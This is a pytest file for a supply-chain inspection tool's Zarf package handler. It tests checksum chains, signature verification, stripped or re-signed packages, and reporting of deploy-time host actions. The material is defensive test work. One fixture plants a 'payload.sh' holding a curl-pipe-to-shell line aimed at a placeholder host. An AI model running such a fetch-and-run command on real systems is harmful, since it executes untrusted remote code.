"""Zarf packages: the checksum chain, the signature, images, and what deploying would do.

Packages are synthetic (``tests/zarf_fixtures.py``). The handler was also checked against Zarf
1.0.1's published init package; the result is recorded in doc 35.
"""

import hashlib
import sys
from pathlib import Path
from typing import Any

import pytest
import yaml

from airlock.core.model import Result, TrustLevel, UnitKind
from airlock.formats.sigstore import BundleError, parse_bundle
from airlock.handlers.zarf import normalise_image
from airlock.model_inspect import InspectResult
from tests.models_helpers import artifact, findings_of, inspect
from tests.software_fixtures import write
from tests.zarf_fixtures import (
    NAME,
    TOOL,
    KeylessSigner,
    KeySigner,
    build,
    components,
    definition,
    package_bytes,
    relist,
    sha,
    tar,
)

ZARF_RULES = (
    "zarf.package.checksum-mismatch",
    "zarf.package.incomplete",
    "zarf.package.unlisted",
)


def _policy(tmp: Path, kind: str, data: bytes, extra: str = "") -> str:
    tmp.mkdir(parents=True, exist_ok=True)
    path = tmp / "anchor"
    path.write_bytes(data)
    lines = [
        "trust:",
        "  upstream:",
        "    - name: publisher",
        f"      type: {kind}",
        f"      file: {path.as_posix()}",
        f'      sha256: "{hashlib.sha256(data).hexdigest()}"',
        '      scope: ["zarf.package"]',
        *([f"      {line}" for line in extra.splitlines()]),
    ]
    return "\n".join(lines) + "\n"


def _run(
    tmp_path: Path, members: dict[str, bytes], policy: str = "", *, zstd: bool = False
) -> InspectResult:
    name = NAME + (".zst" if zstd else "")
    root = write(tmp_path / "d", {name: package_bytes(members, zstd=zstd)})
    return inspect(root, policy_yaml=policy)


def _unit(result: InspectResult) -> dict[str, Any]:
    unit = next(u for u in result.analysis.units if u.kind is UnitKind.ZARF_PACKAGE)
    return dict(unit.attributes)


def _failed(result: InspectResult, rule: str) -> list[dict[str, Any]]:
    return [dict(f.detail) for f in findings_of(result).get(rule, []) if f.result is Result.FAIL]


# --- a consistent package -----------------------------------------------------------------------


def test_clean_unsigned_package(tmp_path: Path) -> None:
    result = _run(tmp_path, build())
    for rule in (*ZARF_RULES, "upstream.signature.invalid", "upstream.signature.untrusted"):
        assert rule not in findings_of(result), rule
    unit = _unit(result)
    assert unit["name"] == "demo-app" and unit["version"] == "1.0.0"
    assert unit["schema"] == "zarf.dev/v1alpha1"
    assert unit["signature"] == {"status": "unsigned"}
    assert unit["componentFilesChecked"] == 1
    checksums = unit["checksums"]
    assert isinstance(checksums, dict) and checksums["aggregate"] == "matches"
    # Unsigned but consistent: every listed member is vouched for by an unauthenticated list.
    component = artifact(result, f"{NAME}!/components/app.tar")
    assert [v.level for v in component.verifications] == [TrustLevel.CHECKSUM]
    # The images form their own unit, checked like any OCI layout.
    images = next(u for u in result.analysis.units if u.kind is UnitKind.CONTAINER_IMAGE)
    assert images.root.display == f"{NAME}!/images/index.json"
    assert "container.layer.digest-mismatch" not in findings_of(result)


def test_everything_inside_is_inspected_including_a_model_in_an_image_layer(
    tmp_path: Path,
) -> None:
    result = _run(tmp_path, build())
    displays = {a.ref.display: a for a in result.analysis.artifacts}
    model = next(d for d in displays if d.endswith("models/tiny/model.safetensors"))
    assert "model.safetensors" in displays[model].kinds
    assert any(u.kind is UnitKind.MODEL_PACKAGE for u in result.analysis.units)
    assert f"{NAME}!/components/app.tar!/app/files/0/tool" in displays


def test_v1beta1_package(tmp_path: Path) -> None:
    document = definition()
    document["apiVersion"] = "zarf.dev/v1beta1"
    component = document["components"][0]
    component["images"] = [{"name": n} for n in component["images"]]
    component["files"] = [
        {
            "source": "https://example.org/releases/tool",
            "checksum": f"sha256:{sha(TOOL)}",
            "destination": "/usr/local/bin/tool",
            "executable": True,
        }
    ]
    result = _run(tmp_path, build(document, aggregate_key="build"))
    for rule in ZARF_RULES:
        assert rule not in findings_of(result), rule
    assert _unit(result)["schema"] == "zarf.dev/v1beta1"
    assert _unit(result)["componentFilesChecked"] == 1
    (host,) = _failed(result, "zarf.component.host-files")
    assert host["files"] == [
        {"component": "app", "target": "/usr/local/bin/tool", "executable": True, "symlinks": []}
    ]


def test_unknown_schema_is_not_assessed(tmp_path: Path) -> None:
    document = definition()
    document["apiVersion"] = "zarf.dev/v9"
    result = _run(tmp_path, build(document))
    assessed = findings_of(result)["zarf.package.checksum-mismatch"]
    assert assessed[0].result is Result.NOT_ASSESSED
    assert "unknown Zarf package schema" in str(assessed[0].not_assessed_reason)


# --- the checksum chain (final) ---------------------------------------------------------------


def test_changed_member_is_a_final_checksum_mismatch(tmp_path: Path) -> None:
    members = build()
    members["sboms.tar"] = tar({"demo-app.json": b'{"artifacts": ["edited"]}'})
    (detail,) = _failed(_run(tmp_path, members), "zarf.package.checksum-mismatch")
    assert [f["file"] for f in detail["files"]] == ["sboms.tar"]


def test_changed_checksum_list_breaks_the_aggregate(tmp_path: Path) -> None:
    members = build()
    members["checksums.txt"] += b"0" * 64 + b" extra.bin\n"
    result = _run(tmp_path, members)
    (detail,) = _failed(result, "zarf.package.checksum-mismatch")
    assert detail["files"][0]["file"] == "checksums.txt"
    # A broken chain vouches for nothing.
    assert not artifact(result, f"{NAME}!/components/app.tar").verifications


def test_unlisted_file_is_final(tmp_path: Path) -> None:
    members = build()
    members["extra/payload.sh"] = b"#!/bin/sh\ncurl example.org | sh\n"
    (detail,) = _failed(_run(tmp_path, members), "zarf.package.unlisted")
    assert detail["files"] == ["extra/payload.sh"]


def test_listed_file_that_is_absent(tmp_path: Path) -> None:
    members = build()
    del members["sboms.tar"]
    (detail,) = _failed(_run(tmp_path, members), "zarf.package.incomplete")
    assert detail["missing"] == ["sboms.tar"]


def test_component_file_differs_from_its_recorded_checksum(tmp_path: Path) -> None:
    members = build(parts=components(files={"app/files/0/tool": b"#!/bin/sh\necho swapped\n"}))
    (detail,) = _failed(_run(tmp_path, members), "zarf.package.checksum-mismatch")
    assert detail["componentFiles"][0]["file"] == "components/app.tar: app/files/0/tool"


def test_image_a_component_deploys_is_missing(tmp_path: Path) -> None:
    images = {"docker.io/library/demo-app:1.0": {"app/run": b"x"}}
    (detail,) = _failed(_run(tmp_path, build(images=images)), "zarf.package.incomplete")
    assert detail["missing"] == ["image ghcr.io/example/model-server:2.1"]


def test_differential_package(tmp_path: Path) -> None:
    images = {"docker.io/library/demo-app:1.0": {"app/run": b"x"}}
    document = definition(differential=True, differentialPackageVersion="0.9.0")
    result = _run(tmp_path, build(document, images=images))
    assert not _failed(result, "zarf.package.incomplete")
    (detail,) = _failed(result, "zarf.package.differential")
    assert detail["base"] == "0.9.0"
    (skipped,) = findings_of(result)["zarf.package.incomplete"]
    assert skipped.result is Result.NOT_ASSESSED and "0.9.0" in str(skipped.not_assessed_reason)


# --- what deploying would do ---------------------------------------------------------------------


def test_host_actions_and_files_are_reported(tmp_path: Path) -> None:
    document = definition()
    component = document["components"][0]
    component["files"][0]["target"] = "/usr/sbin/tool"
    component["files"][0]["symlinks"] = ["/usr/bin/tool"]
    component["actions"] = {
        "onCreate": {"before": [{"cmd": "make images"}]},
        "onDeploy": {"after": [{"cmd": "systemctl restart tool", "description": "restart"}]},
        "onRemove": {"before": [{"cmd": "rm /usr/sbin/tool"}, {"wait": {"cluster": {}}}]},
    }
    result = _run(tmp_path, build(document))
    (actions,) = _failed(result, "zarf.component.actions")
    assert [a["cmd"] for a in actions["actions"]] == [
        "systemctl restart tool",
        "rm /usr/sbin/tool",
    ]
    assert findings_of(result)["zarf.component.actions"][0].severity.value == "medium"
    (files,) = _failed(result, "zarf.component.host-files")
    assert files["files"][0]["symlinks"] == ["/usr/bin/tool"]
    assert _unit(result)["createActions"] == [
        {"component": "app", "event": "onCreate", "stage": "before", "cmd": "make images"}
    ]


# --- the signature ------------------------------------------------------------------------------


def test_key_signed_package_verified_against_a_pinned_key(tmp_path: Path) -> None:
    signer = KeySigner()
    policy = _policy(tmp_path / "keys", "x509", signer.public_pem)
    result = _run(tmp_path, build(signer=signer), policy)
    assert "upstream.signature.invalid" not in findings_of(result)
    assert "upstream.signature.untrusted" not in findings_of(result)
    assert _unit(result)["signature"]["status"] == "verified"
    # The signature reaches every member through the aggregate checksum.
    component = artifact(result, f"{NAME}!/components/app.tar")
    assert [v.level for v in component.verifications] == [TrustLevel.SIGNATURE]
    assert component.verifications[0].anchor == "publisher"


def test_keyless_signature_verified_offline(tmp_path: Path) -> None:
    signer = KeylessSigner()
    extra = 'identities: ["https://ci.example.org/release.yml@refs/tags/v*"]\n'
    extra += 'issuers: ["https://token.example.org"]'
    policy = _policy(tmp_path / "root", "sigstore", signer.trusted_root, extra)
    result = _run(tmp_path, build(signer=signer), policy)
    signature = _unit(result)["signature"]
    assert isinstance(signature, dict) and signature["status"] == "verified", signature
    assert signature["method"] == "sigstore"
    definition_file = artifact(result, f"{NAME}!/zarf.yaml")
    assert definition_file.verifications[0].level is TrustLevel.SIGNATURE


def test_keyless_signer_the_policy_does_not_accept(tmp_path: Path) -> None:
    signer = KeylessSigner("https://ci.example.org/someone-else.yml@refs/heads/main")
    extra = 'identities: ["https://ci.example.org/release.yml@refs/tags/v*"]'
    policy = _policy(tmp_path / "root", "sigstore", signer.trusted_root, extra)
    result = _run(tmp_path, build(signer=signer), policy)
    (detail,) = _failed(result, "upstream.signature.untrusted")
    assert detail["status"] == "untrusted"
    assert "upstream.signature.invalid" not in findings_of(result)
    # Still consistent, so its members keep checksum-level trust.
    component = artifact(result, f"{NAME}!/components/app.tar")
    assert [v.level for v in component.verifications] == [TrustLevel.CHECKSUM]


def test_changed_definition_after_signing_is_invalid(tmp_path: Path) -> None:
    signer = KeySigner()
    members = build(signer=signer)
    members["zarf.yaml"] = members["zarf.yaml"].replace(b"version: 1.0.0", b"version: 1.0.1")
    policy = _policy(tmp_path / "keys", "x509", signer.public_pem)
    (detail,) = _failed(_run(tmp_path, members, policy), "upstream.signature.invalid")
    assert detail["status"] == "invalid"


def test_repacked_with_another_key_is_untrusted(tmp_path: Path) -> None:
    publisher, attacker = KeySigner(), KeySigner()
    members = build(signer=attacker)
    policy = _policy(tmp_path / "keys", "x509", publisher.public_pem)
    (detail,) = _failed(_run(tmp_path, members, policy), "upstream.signature.untrusted")
    assert detail["status"] == "untrusted"


def test_stripped_signature_on_a_package_that_says_it_is_signed(tmp_path: Path) -> None:
    members = build(signer=KeySigner())
    del members["zarf.bundle.sig"]
    (detail,) = _failed(_run(tmp_path, members), "upstream.signature.untrusted")
    assert detail["status"] == "missing"


def test_stripped_signature_and_flag_leave_an_unsigned_package(tmp_path: Path) -> None:
    """Without a pinned minimum trust level, nothing marks this: airlock records it as unsigned,
    with checksum-level trust, so ``trust.minimumLevels`` can require more."""
    members = build(signer=KeySigner())
    del members["zarf.bundle.sig"]
    document = yaml.safe_load(members["zarf.yaml"])
    document["build"]["signed"] = False
    members["zarf.yaml"] = yaml.safe_dump(document, sort_keys=False).encode()
    relist(members)
    result = _run(tmp_path, members)
    assert _unit(result)["signature"] == {"status": "unsigned"}
    component = artifact(result, f"{NAME}!/components/app.tar")
    assert [v.level for v in component.verifications] == [TrustLevel.CHECKSUM]


def test_message_signature_needs_its_artifact() -> None:
    bundle = KeySigner()(b"kind: ZarfPackageConfig\n")
    with pytest.raises(BundleError, match="needs the artifact"):
        parse_bundle(bundle)
    with pytest.raises(BundleError, match="different digest"):
        parse_bundle(bundle, artifact=b"kind: ZarfInitConfig\n")
    assert parse_bundle(bundle, artifact=b"kind: ZarfPackageConfig\n").kind == "message"


# --- compression -------------------------------------------------------------------------------


@pytest.mark.skipif(sys.version_info < (3, 14), reason="zstd is in the standard library from 3.14")
def test_zstd_package_is_read_on_python_314(tmp_path: Path) -> None:
    result = _run(tmp_path, build(), zstd=True)
    for rule in ZARF_RULES:
        assert rule not in findings_of(result), rule
    assert _unit(result)["checksums"]["matched"] > 0


@pytest.mark.skipif(sys.version_info >= (3, 14), reason="before 3.14 zstd cannot be read")
def test_zstd_package_is_not_assessed_before_python_314(tmp_path: Path) -> None:
    root = write(tmp_path / "d", {NAME + ".zst": b"\x28\xb5\x2f\xfd" + b"\x00" * 64})
    result = inspect(root)
    (finding,) = findings_of(result)["zarf.package.checksum-mismatch"]
    assert finding.result is Result.NOT_ASSESSED
    assert "Python 3.14" in str(finding.not_assessed_reason)
    assert "metadata.uncompressed" in str(finding.not_assessed_reason)


def test_named_like_a_package_but_not_one(tmp_path: Path) -> None:
    root = write(tmp_path / "d", {NAME: tar({"readme.txt": b"hello"})})
    result = inspect(root)
    assert KIND_ZARF not in artifact(result, NAME).kinds
    assert "zarf.package.checksum-mismatch" not in findings_of(result)


KIND_ZARF = "zarf.package"


def test_image_references_are_normalised() -> None:
    assert normalise_image("registry") == "docker.io/library/registry:latest"
    assert normalise_image("library/registry:3.1.1") == "docker.io/library/registry:3.1.1"
    assert normalise_image("alpine/socat:1.8.0.3") == "docker.io/alpine/socat:1.8.0.3"
    assert normalise_image("ghcr.io/zarf-dev/zarf/agent:v1.0.1") == (
        "ghcr.io/zarf-dev/zarf/agent:v1.0.1"
    )
    assert normalise_image("index.docker.io/library/x:1") == "docker.io/library/x:1"
    assert normalise_image("localhost:5000/x") == "localhost:5000/x:latest"
    assert normalise_image("x@sha256:" + "0" * 64) == "docker.io/library/x@sha256:" + "0" * 64
